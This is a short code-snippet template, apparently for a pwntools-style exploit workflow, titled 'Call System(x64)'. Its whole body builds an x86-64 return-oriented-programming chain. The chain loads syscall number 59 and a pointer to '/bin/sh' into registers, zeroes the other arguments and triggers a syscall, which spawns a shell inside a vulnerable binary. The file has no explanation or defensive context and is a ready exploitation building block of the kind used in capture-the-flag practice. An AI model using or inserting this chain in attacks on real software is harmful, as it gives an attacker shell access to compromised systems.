# HEADER
# name: Call System(x64)
# prefix: rop-call-execve
# description: execve("/bin/sh", 0, 0)
# author: keymoon

# VARIABLES
# _rop: rop
# _bin: bin

# BODY
_rop += p64(next(_bin.gadget("pop rax; ret;")))
_rop += p64(59)
_rop += p64(next(_bin.gadget("pop rdi; ret;")))
_rop += p64(next(_bin.search(b"/bin/sh\x00")))
_rop += p64(next(_bin.gadget("pop rsi; ret;")))
_rop += p64(0)
_rop += p64(next(_bin.gadget("pop rdx; ret;")))
_rop += p64(0)
_rop += p64(next(_bin.gadget("syscall;")))
